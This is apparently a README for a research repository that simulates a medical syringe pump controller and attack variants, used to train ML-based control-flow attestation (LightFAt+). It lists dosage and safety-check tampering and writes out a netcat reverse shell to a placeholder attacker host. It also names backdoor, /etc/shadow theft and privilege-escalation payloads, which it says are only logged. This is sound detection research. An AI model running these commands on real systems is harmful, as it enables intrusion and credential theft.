# Syringe Pump Attack Variations for LightFAt+ Validation

This directory contains implementations of a syringe pump controller and three distinct attack variations for validating the LightFAt+ control-flow attestation approach on embedded systems.

## Overview

Based on the open-source syringe pump design from C-FLAT, these implementations model realistic attack scenarios that could compromise embedded medical devices. Each attack variation demonstrates different classes of control-flow integrity violations while providing realistic performance counter patterns for machine learning-based attestation.

## Attack Implementations

### 1. Normal Syringe Pump (`main.c` / `syringe_pump`)

The baseline implementation simulating a medical syringe pump controller with:
- Precise motor control with timing-critical loops
- Volume calculation and safety validation
- State tracking (position, volume dispensed)
- Multiple test sequences (small doses, large doses, refill operations)

**Usage:**
```bash
./syringe_pump
```

### 2. Node Skipping Attacks (`attack_node_skipping.c` / `attack_node_skipping`)

Models attacks that bypass critical control-flow nodes:
- **Volume validation bypass**: Skip safety checks allowing dangerous overdoses
- **Step calculation bypass**: Use corrupted motor step counts
- **State update bypass**: Skip tracking updates causing system inconsistency
- **Timing delay bypass**: Skip motor safety delays risking hardware damage

**Usage:**
```bash
./attack_node_skipping                    # Demonstrate all attack modes
```

### 3. Arbitrary Code Execution Attacks (`attack_arbitrary_execution.c` / `attack_arbitrary_execution`)

Models realistic post-exploitation scenarios with authentic malicious payloads:
- **Reverse Shell**: `nc -e /bin/sh attacker.com 4444`
- **Data Exfiltration**: Steal `/etc/passwd`, `/etc/shadow`, system logs
- **Backdoor Installation**: Create persistent netcat listener
- **Privilege Escalation**: `sudo su`, setuid modifications
- **Lateral Movement**: Network reconnaissance, SSH lateral movement

**Usage:**
```bash
./attack_arbitrary_execution              # Demonstrate all attack modes
./attack_arbitrary_execution random       # Random attack for ML training
./attack_arbitrary_execution normal       # Normal operation for baseline
```

**For Machine Learning Training:**
```bash
# Generate 1000 attack traces
for i in {1..1000}; do ./attack_arbitrary_execution random >> attack_traces.log; done

# Generate 1000 normal traces  
for i in {1..1000}; do ./attack_arbitrary_execution normal >> normal_traces.log; done
```

### 4. Data Corruption Attacks (`attack_data_corruption.c` / `attack_data_corruption`)

Models attacks that corrupt critical data structures affecting control flow:
- **Loop counter corruption**: Cause motors to run 5× longer than intended
- **Dosage amount corruption**: Multiply dosage by up to 10× (overdose potential)
- **Timing parameter corruption**: Accelerate motor speeds to dangerous levels
- **State corruption**: Corrupt position/volume tracking
- **Configuration corruption**: Corrupt calibration parameters

**Usage:**
```bash
./attack_data_corruption                  # Demonstrate all attack modes
```

## Build Instructions

### Build All Targets
```bash
make all                    # Build all attack variations
make clean                  # Remove all compiled binaries
```

### Build Individual Targets
```bash
make syringe_pump           # Build normal pump
make attack_node_skipping   # Build node skipping attacks
make attack_arbitrary_execution  # Build arbitrary execution attacks  
make attack_data_corruption # Build data corruption attacks
```

### Testing and Validation
```bash
make test                   # Test normal pump operation
make attacks               # Run all attack demonstrations
make performance           # Compare execution times across all variations
```

## Attack Artifacts

The arbitrary execution attacks generate realistic forensic artifacts:

- `/tmp/attack_log.txt` - Log of malicious commands executed
- `/tmp/backdoor.sh` - Persistent backdoor script
- `/tmp/current_user.txt` - User reconnaissance results
- `/tmp/network_scan.txt` - Network discovery results
- `/tmp/exfiltrated_logs.txt` - Simulated stolen data
- `/tmp/ssh_processes.txt` - SSH process enumeration

## Performance Characteristics

Typical execution times for different attack modes:

| Attack Type | Execution Time | Notes |
|-------------|----------------|-------|
| Normal Operation | 50-100ms | Depends on bolus size and motor steps |
| Node Skipping | 0-50ms | Faster due to bypassed operations |
| Arbitrary Execution | 5-70ms | Varies by payload complexity |
| Data Corruption | 10-200ms | Depends on corruption severity |

## Machine Learning Integration

### Randomized Attack Selection

The arbitrary execution attack supports randomized selection for ML training:

```bash
# Random attack with varying parameters
./attack_arbitrary_execution random
```

This randomly selects from:
- 5 attack payload types (reverse shell, data exfiltration, backdoor, privilege escalation, lateral movement)
- 5 dosage amounts (0.05, 0.1, 0.25, 0.5, 1.0 mL)
- Execution time measurements for performance counter correlation

### Training Data Generation

Example script for generating training datasets:

```bash
#!/bin/bash
# Generate balanced dataset
echo "Generating attack traces..."
for i in {1..500}; do
    echo "Attack,$i" >> dataset.csv
    ./attack_arbitrary_execution random | grep "Execution time" >> dataset.csv
done

echo "Generating normal traces..."
for i in {1..500}; do  
    echo "Normal,$i" >> dataset.csv
    ./attack_arbitrary_execution normal | grep "Execution time" >> dataset.csv
done
```

## Safety and Ethics

**WARNING**: These implementations are for research purposes only!

- All malicious payloads are safely logged, not executed
- No actual system compromise occurs
- Files are created only in `/tmp/` directory
- Designed for controlled experimental environments

## Dependencies

- GCC compiler with C99 support
- POSIX-compliant system (Linux/macOS)
- Standard C libraries: `stdio.h`, `stdlib.h`, `unistd.h`, `time.h`, `math.h`

## Related Work

This implementation is based on the syringe pump application used in:
- C-FLAT: Control-flow Attestation for Embedded Systems Software (CCS 2016)
- Original Arduino syringe pump: https://github.com/manimino/OpenSyringePump

## Citation

If you use these attack implementations in your research, please cite:

```bibtex
@inproceedings{lightfat2024,
  title={LightFAt+: Lightweight Control-flow Attestation for Embedded Systems},
  author={[Authors]},
  booktitle={[Conference]},
  year={2024}
}
```

## Files

- `main.c` - Normal syringe pump implementation
- `attack_node_skipping.c` - Node skipping attack variation
- `attack_arbitrary_execution.c` - Arbitrary code execution attack variation  
- `attack_data_corruption.c` - Data corruption attack variation
- `Makefile` - Build configuration for all targets
- `README.md` - This documentation

## Support

For questions or issues related to these implementations, please refer to the LightFAt+ project documentation or contact the research team.